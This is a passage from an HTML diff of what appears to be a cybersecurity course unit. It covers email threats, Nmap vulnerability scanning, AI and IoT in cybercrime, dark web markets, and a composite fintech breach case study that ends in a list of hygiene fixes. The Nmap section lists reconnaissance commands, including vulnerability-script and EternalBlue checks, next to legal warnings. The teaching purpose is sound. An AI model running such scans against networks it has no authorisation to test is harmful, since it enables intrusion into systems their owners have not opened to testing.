+      <div class="tc-eg">Emotet malware — delivered via malicious Word macros in "invoice" emails — infected millions</div>
+    </div>
+    <div class="two-col-card imp-c">
+      <span class="tc-icon">📧</span>
+      <h4>Email Spoofing</h4>
+      <p>Forging the "From" field of an email to make it appear to come from a trusted sender (support@hdfc.com, payroll@yourcompany.com) — exploiting the fact that legacy email protocols (SMTP) have no sender authentication. Countered by DKIM, SPF, and DMARC records but many organisations have not implemented them.</p>
+      <div class="tc-eg">Spoofed email from "income-tax@gov.in" — tax refund phishing claiming ₹12,340 refund pending</div>
+    </div>
+    <div class="two-col-card imp-d">
+      <span class="tc-icon">💣</span>
+      <h4>Email Bombing</h4>
+      <p>Flooding a target's inbox with thousands of emails — to distract them while a separate fraudulent transaction (password reset, bank transfer, account takeover) takes place. The victim cannot find the critical notification (e.g. "Your password was changed") buried in thousands of subscription confirmation emails triggered by the attacker.</p>
+      <div class="tc-eg">Attacker subscribes victim's email to 10,000 newsletters → victim misses the "Your bank password was changed" alert</div>
+    </div>
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>FBI IC3 BEC Report 2023: https://www.ic3.gov/Media/PDF/AnnualReport/2023_IC3Report.pdf</li>
+      <li>HaveIBeenPwned — Check if your data is in a breach: https://haveibeenpwned.com</li>
+      <li>Magecart Attack Analysis — RiskIQ: https://www.riskiq.com/research/magecart/</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.8 — NETWORK VULNERABILITIES & NMAP
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-8">
+  <div class="topic-label">Topic 2.8</div>
+  <h2 class="topic-title">Network Vulnerabilities: Overview of Vulnerability Scanning with Nmap</h2>
+
+  <div class="concept-box">
+    <strong>Network vulnerability scanning</strong> is the systematic process of identifying open ports, running services, software versions, and known vulnerabilities on networked systems — before attackers do. <strong>Nmap (Network Mapper)</strong> is the most widely used open-source network scanner, created by Gordon Lyon ("Fyodor") in 1997. It is used by both ethical hackers (to secure networks) and attackers (to identify targets) — making it both a defensive and offensive tool depending on authorization.
+  </div>
+
+  <div class="tip-box">
+    <div class="tip-label">📌 Last Night Tip</div>
+    Nmap is used in the <strong>Reconnaissance and Scanning</strong> phases of penetration testing. Key scan types to remember: <strong>-sS</strong> (SYN/Stealth scan — default), <strong>-sV</strong> (Version detection), <strong>-O</strong> (OS detection), <strong>-A</strong> (Aggressive — all of the above), <strong>-p</strong> (specify ports), <strong>-sn</strong> (Ping scan/host discovery — no port scan). Always get written permission before scanning any network you do not own.
+  </div>
+
+  <h3>Common Network Vulnerabilities Detected by Scanning</h3>
+  <div class="three-grid">
+    <div class="three-card">
+      <span class="card-icon">🚪</span>
+      <h4>Open Ports &amp; Services</h4>
+      <p>Every open port is a potential entry point. Telnet (23), FTP (21), RDP (3389), SMB (445) — if left open and unpatched, these are primary targets. Nmap identifies all listening ports and the service/version running on each.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔓</span>
+      <h4>Default Credentials</h4>
+      <p>Routers, cameras, and IoT devices shipped with default passwords (admin/admin, admin/password) that are never changed. Nmap scripts (NSE) can test for default credentials on identified services — a common vulnerability in home and SME networks.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔧</span>
+      <h4>Unpatched Services</h4>
+      <p>Running outdated versions of Apache, OpenSSH, MySQL, or Windows services with known CVEs. Nmap's -sV flag identifies version numbers — which can be cross-referenced with the NVD to find known exploitable vulnerabilities immediately.</p>
+    </div>
+  </div>
+
+  <h3>Essential Nmap Commands</h3>
+
+  <div class="code-block">
+<span class="cmd-comment"># ── BASIC HOST DISCOVERY ────────────────────────────────────</span>
+nmap <span class="cmd-flag">-sn</span> <span class="cmd-target">192.168.1.0/24</span>          <span class="cmd-comment"># Ping scan — discover live hosts (no port scan)</span>
+nmap <span class="cmd-target">192.168.1.1</span>                   <span class="cmd-comment"># Default scan — top 1000 TCP ports</span>
+
+<span class="cmd-comment"># ── PORT SCANNING ───────────────────────────────────────────</span>
+nmap <span class="cmd-flag">-sS</span> <span class="cmd-target">192.168.1.1</span>              <span class="cmd-comment"># SYN stealth scan (requires root) — fastest &amp; most common</span>
+nmap <span class="cmd-flag">-p 80,443,22,3306</span> <span class="cmd-target">192.168.1.1</span> <span class="cmd-comment"># Scan specific ports only</span>
+nmap <span class="cmd-flag">-p-</span> <span class="cmd-target">192.168.1.1</span>              <span class="cmd-comment"># Scan ALL 65535 ports</span>
+nmap <span class="cmd-flag">-sU</span> <span class="cmd-target">192.168.1.1</span>              <span class="cmd-comment"># UDP scan (slower — DNS:53, SNMP:161, NTP:123)</span>
+
+<span class="cmd-comment"># ── SERVICE &amp; VERSION DETECTION ─────────────────────────────</span>
+nmap <span class="cmd-flag">-sV</span> <span class="cmd-target">192.168.1.1</span>              <span class="cmd-comment"># Detect service name and version on open ports</span>
+nmap <span class="cmd-flag">-O</span>  <span class="cmd-target">192.168.1.1</span>              <span class="cmd-comment"># OS fingerprinting — detect operating system</span>
+nmap <span class="cmd-flag">-A</span>  <span class="cmd-target">192.168.1.1</span>              <span class="cmd-comment"># Aggressive: OS + version + scripts + traceroute</span>
+
+<span class="cmd-comment"># ── NSE SCRIPTING ENGINE ────────────────────────────────────</span>
+nmap <span class="cmd-flag">--script vuln</span> <span class="cmd-target">192.168.1.1</span>     <span class="cmd-comment"># Run all vulnerability detection scripts</span>
+nmap <span class="cmd-flag">--script http-title</span> <span class="cmd-target">192.168.1.1</span> <span class="cmd-comment"># Grab webpage titles from web servers</span>
+nmap <span class="cmd-flag">--script smb-vuln-ms17-010</span> <span class="cmd-target">192.168.1.1</span> <span class="cmd-comment"># Check for EternalBlue (WannaCry) vulnerability</span>
+
+<span class="cmd-comment"># ── OUTPUT ──────────────────────────────────────────────────</span>
+nmap <span class="cmd-flag">-oN</span> scan_results.txt <span class="cmd-target">192.168.1.0/24</span>  <span class="cmd-comment"># Save output in normal readable format</span>
+nmap <span class="cmd-flag">-oX</span> scan_results.xml <span class="cmd-target">192.168.1.0/24</span>  <span class="cmd-comment"># Save output in XML (for import into Metasploit)</span>
+  </div>
+
+  <div class="example-box">
+    <div class="ex-label">Sample Nmap Output — Reading the Results</div>
+    <pre style="font-family:'JetBrains Mono',monospace;font-size:0.78rem;line-height:1.6;background:none;border:none;padding:0;">
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 192.168.1.1
+Host is up (0.0012s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.6 (CentOS)
+443/tcp  open  https      Apache httpd 2.4.6
+3306/tcp open  mysql      MySQL 5.7.39
+8080/tcp open  http-proxy Squid http proxy 3.5.20
+
+OS detection: Linux 3.X|4.X — running on Linux kernel
+    </pre>
+    <strong>Analyst reads this as:</strong> SSH on port 22 (check version for vulnerabilities), Apache 2.4.6 (check NVD — known CVEs exist), MySQL exposed on 3306 externally (should be blocked — critical risk), Squid proxy on 8080 (check for open proxy misuse).
+  </div>
+
+  <h3>Network Vulnerability Scanning Tools Comparison</h3>
+  <table class="data-table no-bold">
+    <thead><tr><th>Tool</th><th>Type</th><th>Key Use</th><th>Cost</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Nmap</strong></td><td>Port scanner / OS &amp; service detection</td><td>Network discovery, port mapping, version detection, NSE scripting</td><td>Free / Open Source</td></tr>
+      <tr><td><strong>Nessus</strong></td><td>Full vulnerability scanner</td><td>Comprehensive CVE-based vulnerability assessment with severity ratings</td><td>Paid (Nessus Essentials = free for 16 IPs)</td></tr>
+      <tr><td><strong>OpenVAS</strong></td><td>Full vulnerability scanner</td><td>Open-source alternative to Nessus — GVM (Greenbone Vulnerability Manager)</td><td>Free / Open Source</td></tr>
+      <tr><td><strong>Nikto</strong></td><td>Web server scanner</td><td>Scan web servers for outdated software, misconfigurations, dangerous files</td><td>Free / Open Source</td></tr>
+      <tr><td><strong>Metasploit</strong></td><td>Exploitation framework</td><td>Exploit identified vulnerabilities — verifies if vulnerabilities are actually exploitable</td><td>Free (Community) / Paid (Pro)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="warn-box">
+    <div class="warn-label">⚠️ Legal Warning</div>
+    Scanning a network or system you do not own or do not have explicit written permission to scan is <strong>illegal in India under IT Act Section 43 and Section 66</strong> — regardless of intent. Ethical hackers always obtain a signed Scope of Work (SOW) or Letter of Authorisation (LoA) before conducting any scan. "I was just learning Nmap" is not a legal defence.
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>Official Nmap Documentation: https://nmap.org/book/toc.html</li>
+      <li>Nmap NSE Script Library: https://nmap.org/nsedoc/</li>
+      <li>Kali Linux — preinstalled with Nmap, Nessus, OpenVAS: https://www.kali.org</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.9 — AI AND IoT IMPACT ON CYBERCRIME
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-9">
+  <div class="topic-label">Topic 2.9</div>
+  <h2 class="topic-title">Impact of Emerging Technologies — AI and IoT on Cybercrime</h2>
+
+  <div class="concept-box">
+    <strong>Artificial Intelligence (AI)</strong> and the <strong>Internet of Things (IoT)</strong> are transforming cybercrime in fundamentally different ways. AI dramatically lowers the technical skill barrier for attackers, enables attacks at unprecedented scale, and makes deception more convincing. IoT massively expands the attack surface — billions of insecure connected devices form the new battleground and a new resource pool for cybercriminals.
+  </div>
+
+  <h3>Artificial Intelligence — How It Empowers Cybercriminals</h3>
+  <div class="impact-grid">
+    <div class="imp-card imp-a">
+      <span class="imp-icon">✍️</span>
+      <h4>AI-Generated Phishing</h4>
+      <p>Large Language Models (LLMs) generate grammatically perfect, contextually relevant, culturally appropriate phishing emails in any language — at zero cost and infinite scale. Traditional defences that relied on spotting spelling errors and awkward phrasing in phishing emails no longer work. AI-crafted spear phishing targeting specific individuals is now within reach of low-skilled attackers.</p>
+    </div>
+    <div class="imp-card imp-b">
+      <span class="imp-icon">🎙️</span>
+      <h4>Voice Cloning (Vishing 2.0)</h4>
+      <p>With just 3–10 seconds of audio (from a YouTube video, public speech, or phone call), AI voice cloning tools (ElevenLabs, Resemble AI) can generate realistic real-time voice mimicry. Used in CEO fraud — an employee receives a "phone call from the CEO" instructing an urgent wire transfer. The voice is indistinguishable from the real person.</p>
+    </div>
+    <div class="imp-card imp-c">
+      <span class="imp-icon">🎬</span>
+      <h4>Deepfakes for Fraud</h4>
+      <p>AI-generated realistic video of real people saying things they never said — used for sextortion (placing a victim's face on pornographic content), corporate fraud (fake CEO video authorising transactions), political disinformation, and bypassing video-based KYC identity verification in banks and crypto exchanges.</p>
+    </div>
+    <div class="imp-card imp-d">
+      <span class="imp-icon">🔍</span>
+      <h4>AI-Assisted Vulnerability Discovery</h4>
+      <p>AI tools analyse vast codebases to automatically discover security vulnerabilities — both for defenders (automated security testing) and attackers (fuzzing tools guided by ML). AI can generate working exploit code for known vulnerabilities, dramatically reducing the time from vulnerability discovery to working exploit.</p>
+    </div>
+    <div class="imp-card imp-e">
+      <span class="imp-icon">🔑</span>
+      <h4>Password Cracking Acceleration</h4>
+      <p>AI-powered password cracking (PassGAN, ML-guided hashcat attacks) learns patterns from previously breached password databases and generates highly probable guesses — cracking passwords 6x faster than traditional dictionary/brute-force approaches. Renders many "common" passwords vulnerable much faster than previously.</p>
+    </div>
+    <div class="imp-card imp-f">
+      <span class="imp-icon">🛡️</span>
+      <h4>AI Evasion of Security Tools</h4>
+      <p>Attackers use AI to mutate malware — automatically generating new variants that evade signature-based antivirus detection. AI can test thousands of evasion techniques against known antivirus engines in minutes, producing a variant specifically designed to bypass a target organisation's security stack.</p>
+    </div>
+  </div>
+
+  <h3>Internet of Things (IoT) — The Expanding Attack Surface</h3>
+  <p>By 2030, an estimated <strong>29 billion IoT devices</strong> will be connected globally — smart TVs, IP cameras, smart meters, medical devices, industrial sensors, smart home appliances, vehicles. Most share critical security weaknesses:</p>
+
+  <div class="three-grid">
+    <div class="three-card">
+      <span class="card-icon">🔐</span>
+      <h4>Weak Default Credentials</h4>
+      <p>Most IoT devices ship with default username/password combinations (admin/admin, root/root) that users never change. The Mirai botnet (2016) compromised 600,000+ IoT devices using just 60 default credential combinations — then launched the largest DDoS attack in history.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔧</span>
+      <h4>No Patch Mechanism</h4>
+      <p>Many IoT devices run embedded Linux or custom firmware with no automatic update mechanism — vulnerabilities are never patched. Smart TVs, routers, and IP cameras from 2018 are still connected in 2025 with the same unpatched firmware. Their vulnerabilities are publicly known but will never be fixed.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🏥</span>
+      <h4>Critical Infrastructure Risk</h4>
+      <p>Medical IoT devices (insulin pumps, pacemakers, hospital patient monitors), industrial control systems (power grids, water treatment), and smart city infrastructure — if compromised, attacks move from data theft to physical harm and potential loss of life. Ransomware on hospital IoT directly threatens patient safety.</p>
+    </div>
+  </div>
+
+  <div class="example-box">
+    <div class="ex-label">Real Case — AI Deepfake CFO Fraud (Hong Kong, 2024)</div>
+    <strong>Attack:</strong> A finance employee at a multinational company received a video conference invite from the "CFO." During the call, the CFO and multiple other executives appeared on camera and instructed the employee to transfer HK$200 million (≈₹215 crore) as part of a confidential deal. All participants — including the CFO — were AI deepfake avatars generated from public video footage. The employee transferred the money before discovering the fraud. <strong>Significance:</strong> First confirmed large-scale deepfake video conference fraud case — signals a new category of attack that bypasses even video verification.
+  </div>
+
+  <div class="diagram-wrap">
+    <div class="diagram-title">Fig 2.1 — AI-Enabled Attack Sophistication vs. Defender Detection Capability</div>
+    <div class="chart-container">
+      <canvas id="aiChart"></canvas>
+    </div>
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>WEF Global Cybersecurity Outlook 2024 — AI and Cybercrime: https://www.weforum.org</li>
+      <li>ENISA Threat Landscape for AI 2023: https://www.enisa.europa.eu</li>
+      <li>Gartner IoT Security Forecast 2024: https://www.gartner.com/en/information-technology/insights/internet-of-things</li>
+      <li>CERT-IN Advisory on AI-enabled Cyber Threats: https://www.cert-in.org.in</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     TOPIC 2.10 — THE DARK WEB
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-10">
+  <div class="topic-label">Topic 2.10</div>
+  <h2 class="topic-title">The Dark Web and Cybercrime</h2>
+
+  <div class="concept-box">
+    The <strong>Dark Web</strong> is a subset of the internet that is not indexed by standard search engines and requires specialised software (primarily the <strong>Tor browser</strong>) to access. It provides anonymity to both the operator and visitor through onion routing — encrypting traffic through multiple relay nodes globally. While the dark web has legitimate uses (journalist-source protection, privacy advocacy in authoritarian regimes), it has become the primary marketplace and communication platform for cybercriminals.
+  </div>
+
+  <div class="tip-box">
+    <div class="tip-label">📌 Last Night Tip — Three Layers of the Internet</div>
+    <strong>Surface Web</strong> (~5%): Indexed by Google, publicly accessible — news sites, Wikipedia, social media. <strong>Deep Web</strong> (~90%): Not indexed — emails, bank portals, medical records, subscription content, intranet — not inherently criminal. <strong>Dark Web</strong> (~5% of deep web): Requires Tor, not indexed — anonymous — both legitimate and criminal use. The Dark Web is a small subset of the Deep Web — not everything "deep" is dark or criminal.
+  </div>
+
+  <h3>How the Dark Web Works — Tor and Onion Routing</h3>
+  <div class="phase-strip">
+    <div class="phase-block ph-1">
+      <span class="ph-num">1</span>
+      <span class="ph-title">Tor Client</span>
+      <span class="ph-desc">User's Tor browser encrypts data in three layers (like onion layers) — one for each relay node</span>
+    </div>
+    <div class="phase-block ph-2">
+      <span class="ph-num">2</span>
+      <span class="ph-title">Entry Node</span>
+      <span class="ph-desc">First relay knows user's IP but not destination or content — strips outer encryption layer</span>
+    </div>
+    <div class="phase-block ph-3">
+      <span class="ph-num">3</span>
+      <span class="ph-title">Middle Node</span>
+      <span class="ph-desc">Only knows previous and next node — cannot see origin IP or destination — strips middle layer</span>
+    </div>
+    <div class="phase-block ph-4">
+      <span class="ph-num">4</span>
+      <span class="ph-title">Exit Node</span>
+      <span class="ph-desc">Knows destination but not origin IP — strips final layer and delivers request to .onion site</span>
+    </div>
+    <div class="phase-block ph-5">
+      <span class="ph-num">5</span>
+      <span class="ph-title">.onion Site</span>
+      <span class="ph-desc">Hidden service — only accessible via Tor — server location also concealed through same mechanism</span>
+    </div>
+  </div>
+
+  <h3>Dark Web Cybercrime Ecosystem</h3>
+  <div class="crime-type-grid">
+    <div class="ctg-card cc-dark">
+      <span class="ctg-icon">🛒</span>
+      <h4>Dark Web Marketplaces</h4>
+      <p>Amazon-like platforms selling illegal goods and services — drugs, stolen credit card data, identity documents, hacking tools, exploit kits, and counterfeit currency. Operated with cryptocurrency payments and customer reviews. Hydra (Russia), AlphaBay, Silk Road were/are major examples.</p>
+      <div class="ctg-eg">Silk Road (2011–2013): $1.2 billion in Bitcoin transactions before FBI takedown · Hydra: $1.3 billion/year before 2022 German police seizure</div>
+    </div>
+    <div class="ctg-card cc-red">
+      <span class="ctg-icon">💳</span>
+      <h4>Carding Forums &amp; Data Markets</h4>
+      <p>Platforms selling stolen credit/debit card details, complete identity packages ("fullz" — name, DOB, SSN/Aadhaar, bank details, mother's maiden name), SIM swap credentials, and OTP bypass services. Indian card data regularly appears on markets like BidenCash and AllWorld Cards.</p>
+      <div class="ctg-eg">BidenCash leaked 2.1 million Indian credit cards in Oct 2022 — many still active at time of breach</div>
+    </div>
+    <div class="ctg-card cc-purple">
+      <span class="ctg-icon">🦠</span>
+      <h4>Malware-as-a-Service (MaaS)</h4>
+      <p>Ransomware kits, RATs, spyware, keyloggers, and banking trojans sold or rented with full technical support, customer dashboards, and update subscriptions. Ransomware gangs (LockBit, REvil, Conti) operate as businesses — franchising their ransomware to affiliates for 20–30% of collected ransoms.</p>
+      <div class="ctg-eg">LockBit 3.0 offered "bug bounty" for their own ransomware — operated support chat — $91 million extracted from US organisations alone</div>
+    </div>
+    <div class="ctg-card cc-amber">
+      <span class="ctg-icon">💰</span>
+      <h4>Cryptocurrency &amp; Money Laundering</h4>
+      <p>Dark web transactions primarily use Bitcoin (traceable), Monero (untraceable by design), and Zcash. Criminal proceeds are laundered through "tumbling" services (mixing coins to obscure trail), crypto-to-crypto exchanges without KYC, and DeFi protocols. Monero has become the currency of choice for ransomware gangs and drug markets.</p>
+      <div class="ctg-eg">Lazarus Group laundered $455 million in stolen crypto through Tornado Cash mixer before US sanctioned the service</div>
+    </div>
+    <div class="ctg-card cc-blue">
+      <span class="ctg-icon">🔫</span>
+      <h4>Hiring Criminal Services</h4>
+      <p>Beyond goods, dark web offers services: DDoS-for-hire attacks (starting at $5/hour), hacking-for-hire targeting specific individuals or companies, contract hitmen (most are scams but represent intent), doxxing services, fake review farms, and bulk SMS/call campaigns for fraud operations.</p>
+      <div class="ctg-eg">DDoS-for-hire service "vDOS" generated $600,000 before two Israeli teenagers were arrested</div>
+    </div>
+    <div class="ctg-card cc-green">
+      <span class="ctg-icon">📡</span>
+      <h4>Communication &amp; Coordination</h4>
+      <p>Encrypted forums, chatrooms, and darknet-hosted messaging services allow cybercriminal groups to coordinate, recruit members, share tools and techniques, post announcements of new breaches, and leak stolen data. Telegram has increasingly moved surface-level criminal communication to its encrypted channels.</p>
+      <div class="ctg-eg">BreachForums — dark web forum where stolen Indian government databases were first posted and sold</div>
+    </div>
+  </div>
+
+  <div class="warn-box">
+    <div class="warn-label">⚠️ Legal Position in India</div>
+    Accessing the dark web with Tor is <strong>not illegal in itself</strong> in India. However, buying, selling, or facilitating illegal goods and services on the dark web is fully illegal under the IT Act 2000, IPC/BNS, NDPS Act, and other applicable laws. CBI, ED, and state cyber police have successfully prosecuted dark web drug dealers and data sellers in India. Intelligence agencies actively monitor known dark web markets and Indian .onion forums.
+  </div>
+
+  <div class="ref-box">
+    <div class="ref-label">References</div>
+    <ul>
+      <li>Tor Project Official Site: https://www.torproject.org</li>
+      <li>Europol Dark Web Takedown Reports: https://www.europol.europa.eu</li>
+      <li>BreachForums and Indian Data Sales — CERT-IN: https://www.cert-in.org.in</li>
+      <li>FBI Silk Road Investigation: https://www.fbi.gov/contact-us/field-offices/sanfrancisco/news/silk-road</li>
+    </ul>
+  </div>
+</section>
+
+<hr class="section-divider">
+
+<!-- ══════════════════════════════════════
+     CASE STUDY — CYBER HYGIENE
+══════════════════════════════════════ -->
+<section class="topic-section" id="t2-cs">
+  <div class="topic-label">Case Study</div>
+  <h2 class="topic-title">Importance of Cyber Hygiene — A Multi-Vector Attack Case Study</h2>
+
+  <div class="concept-box">
+    <strong>Cyber Hygiene</strong> refers to the set of regular practices and habitual behaviours that individuals and organisations adopt to maintain the security of their digital environment — analogous to personal hygiene maintaining physical health. Just as washing hands prevents infection, strong passwords, regular updates, and cautious online behaviour prevent cyber compromise. This case study demonstrates how poor cyber hygiene enables a cascading multi-vector attack.
+  </div>
+
+  <div class="case-study-box">
+    <div class="cs-header">🏦 Case Study — "FinTechCo" Multi-Vector Attack · Mumbai · 2023 (Reconstructed Composite)</div>
+    <div class="cs-body">
+
+      <div class="cs-section">
+        <div class="cs-section-title">Background</div>
+        <p>FinTechCo is a mid-sized Mumbai fintech company processing UPI and digital lending transactions for 8 lakh customers. The company had a 45-person IT team but no dedicated security operations centre (SOC). Security audits were conducted annually; the last one was 14 months prior. Average employee cybersecurity awareness training: none in the previous 2 years.</p>
+      </div>
+
+      <div class="cs-section">
+        <div class="cs-section-title">Phase 1 — Reconnaissance (Week 1)</div>
+        <ul>
+          <li>Attackers used <strong>LinkedIn</strong> to identify FinTechCo's IT Director, two senior developers, and the CFO's assistant</li>
+          <li>Using <strong>theHarvester</strong> (OSINT tool), they collected 23 corporate email addresses from public sources</li>
+          <li>A <strong>Shodan</strong> scan revealed FinTechCo's web server was running an unpatched Apache 2.4.49 (CVE-2021-41773 — path traversal vulnerability)</li>
+          <li>The company's DNS records revealed an admin portal accessible at admin.fintechco.internal — which was mistakenly exposed on the public internet</li>
+        </ul>
+      </div>
+
+      <div class="cs-section">
+        <div class="cs-section-title">Phase 2 — Initial Access (Week 2)</div>
+        <ul>
+          <li>Attackers sent a spear-phishing email to the CFO's assistant — subject: "Board Meeting Agenda — Urgent Correction Required" — appearing to come from the CFO's spoofed email address</li>
+          <li>The attachment was a macro-enabled Excel file labelled "Q3_BoardDeck_FINAL.xlsx" — the assistant enabled macros, executing a PowerShell downloader</li>
+          <li>Simultaneously, attackers exploited the Apache path traversal vulnerability to read sensitive configuration files from the web server</li>
+          <li><strong>Poor hygiene failure:</strong> The assistant's corporate laptop had no endpoint protection and macros were enabled by default. The Apache server had not been patched for 8 months despite the CVE being public for 14 months.</li>
+        </ul>
+      </div>
+
+      <div class="cs-section">
+        <div class="cs-section-title">Phase 3 — Lateral Movement and Data Exfiltration (Weeks 3–6)</div>
+        <ul>
+          <li>The malware installed a RAT (Remote Access Trojan) providing the attacker full control of the assistant's machine</li>
+          <li>A <strong>keylogger</strong> captured the assistant's domain credentials, email password, and VPN credentials over 3 days of silent monitoring</li>
+          <li>Using stolen VPN credentials, attackers logged into the internal network — appearing as the legitimate user</li>
+          <li>They discovered the customer database server ran <strong>MySQL with default credentials</strong> (root/root) — unchanged from initial deployment 3 years prior</li>
+          <li>Over 3 weeks, they silently exfiltrated 8 lakh customer records including Aadhaar numbers, PAN, mobile numbers, loan history, and bank account details</li>
+          <li><strong>Poor hygiene failures:</strong> Password reuse, default database credentials, no network segmentation, no DLP (Data Loss Prevention) monitoring, no anomaly detection on VPN access patterns</li>
+        </ul>
+      </div>
+
+      <div class="cs-section">
+        <div class="cs-section-title">Phase 4 — Ransomware Deployment (Week 7)</div>
+        <ul>
+          <li>Having completed data exfiltration, attackers deployed ransomware encrypting all accessible file servers, backups connected to the network, and the customer database</li>
+          <li>Ransom demand: $800,000 in Monero — with a threat to sell the 8 lakh customer records on a dark web marketplace if not paid within 72 hours (double extortion)</li>
+          <li>FinTechCo discovered the attack when employees arrived Monday morning to find all files encrypted with a ransom note on the screen</li>
+          <li><strong>Poor hygiene failure:</strong> Backups were connected to the production network (should be air-gapped) — encrypted along with primary data. No offline backup existed.</li>
+        </ul>
+      </div>
+
+      <div class="cs-section">
+        <div class="cs-section-title">Impact and Response</div>
+        <ul>
+          <li><strong>Operational downtime:</strong> 18 days — complete system rebuild required</li>
+          <li><strong>Customer data:</strong> 8,00,000 customers' PII and financial data compromised — notified under DPDPA 2023 provisions</li>
+          <li><strong>Financial loss:</strong> Estimated ₹12 crore — downtime (₹4 crore), incident response (₹3 crore), customer compensation (₹2 crore), regulatory penalties (₹2 crore), reputational damage (incalculable)</li>
+          <li><strong>Regulatory:</strong> CERT-IN and RBI both investigated — significant penalties and mandatory security audit imposed</li>
+          <li><strong>Legal:</strong> Ransom was not paid. Some customer data appeared on BreachForums within 30 days of the attack</li>
+        </ul>
+        <div class="cs-outcome">
+          <strong>The entire attack was enabled by poor cyber hygiene — not by any particularly sophisticated technique.</strong> The Apache vulnerability was 14 months old. The database used default credentials unchanged for 3 years. The backup was online and unsegmented. No employee had received phishing awareness training in 2 years. Every single attack step could have been stopped by basic hygiene practices.
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <h3>Cyber Hygiene Failures and Their Fixes</h3>
+  <table class="data-table no-bold">
+    <thead><tr><th>Hygiene Failure</th><th>Attack It Enabled</th><th>Simple Fix</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Macros enabled by default</strong></td><td>Macro malware initial access</td><td>Disable macros by default (Group Policy); never enable macros in email attachments</td></tr>
+      <tr><td><strong>Apache server 14 months unpatched</strong></td><td>Path traversal exploitation</td><td>Automated patch management — apply critical patches within 24–72 hours of release</td></tr>
+      <tr><td><strong>No employee phishing training</strong></td><td>Successful spear phishing</td><td>Quarterly phishing simulation + awareness training — reduces click rate by 60–80%</td></tr>
+      <tr><td><strong>Default MySQL credentials (root/root)</strong></td><td>Direct database access</td><td>Change all default passwords on deployment; automated credential scanning (Nessus NSE)</td></tr>
+      <tr><td><strong>Password reuse (VPN = email password)</strong></td><td>Lateral movement via VPN</td><td>Enforce unique passwords with a password manager; implement MFA on VPN and all remote access</td></tr>
+      <tr><td><strong>No network segmentation</strong></td><td>Unrestricted lateral movement to database server</td><td>VLAN segmentation; least privilege network access; Zero Trust network architecture</td></tr>
+      <tr><td><strong>Backups connected to production network</strong></td><td>Ransomware encrypted all backups</td><td>3-2-1 backup rule: 3 copies, 2 media types, 1 offline/air-gapped</td></tr>
+      <tr><td><strong>No anomaly detection / SIEM</strong></td><td>3 weeks of silent exfiltration undetected</td><td>Deploy SIEM (Splunk/Elastic) with anomaly alerts; monitor VPN logins, DB queries, data volumes</td></tr>
+    </tbody>
+  </table>
+
+  <h3>The 10 Pillars of Cyber Hygiene</h3>
+  <div class="three-grid">
+    <div class="three-card">
+      <span class="card-icon">🔄</span>
+      <h4>1. Keep Everything Updated</h4>
+      <p>OS, applications, firmware, antivirus signatures — all updated promptly. Enable automatic updates where possible. Most attacks exploit vulnerabilities that have had patches available for months or years.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔑</span>
+      <h4>2. Strong Unique Passwords + MFA</h4>
+      <p>Use a password manager to generate and store long, unique passwords for every account. Enable Multi-Factor Authentication on every service that supports it — especially email, banking, and work systems.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">💾</span>
+      <h4>3. Regular Offline Backups</h4>
+      <p>Follow the 3-2-1 rule. Test backup restoration regularly — an untested backup is not a backup. Air-gapped offline backups are ransomware-proof by definition.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🔒</span>
+      <h4>4. Encrypt Sensitive Data</h4>
+      <p>Enable full-disk encryption (BitLocker, FileVault) on all laptops. Encrypt data at rest in databases. Use HTTPS for all web communications. Encryption ensures stolen data is useless without the key.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🧠</span>
+      <h4>5. Security Awareness Training</h4>
+      <p>Regular training on phishing, social engineering, and safe browsing for all employees and users. Human error causes 85%+ of breaches — technical controls alone cannot compensate for an untrained workforce.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">📉</span>
+      <h4>6. Minimise Attack Surface</h4>
+      <p>Disable or uninstall unused software and services. Close unnecessary open ports (Nmap your own systems). Remove unused user accounts. Reduce the number of entry points an attacker can target.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">👁️</span>
+      <h4>7. Monitor and Log</h4>
+      <p>Log all access, authentication, and network events. Use SIEM to detect anomalous behaviour. You cannot defend what you cannot see — visibility is the foundation of effective incident response.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">🚦</span>
+      <h4>8. Least Privilege Access</h4>
+      <p>Every user, application, and service should have only the minimum access needed — no more. Regular access reviews remove unnecessary privileges. Limits blast radius when an account is compromised.</p>
+    </div>
+    <div class="three-card">
+      <span class="card-icon">📋</span>
+      <h4>9. Incident Response Plan</h4>
+      <p>Have a documented, tested plan for responding to cyber incidents — who does what, in what order. An organisation that plans for breaches recovers in days; one that doesn't may never recover.</p>
+    </div>
+  </div>
+
+  <div class="diagram-wrap">
+    <div class="diagram-title">Fig 2.2 — Cyber Hygiene Failures by Frequency in Indian SME Breaches (2023)</div>
+    <div class="chart-container">
+      <canvas id="hygieneChart"></canvas>
+    </div>
+  </div>
+
+  <div class="conclusion-box">
+    <div class="con-label">Unit 2 — Final Takeaway</div>
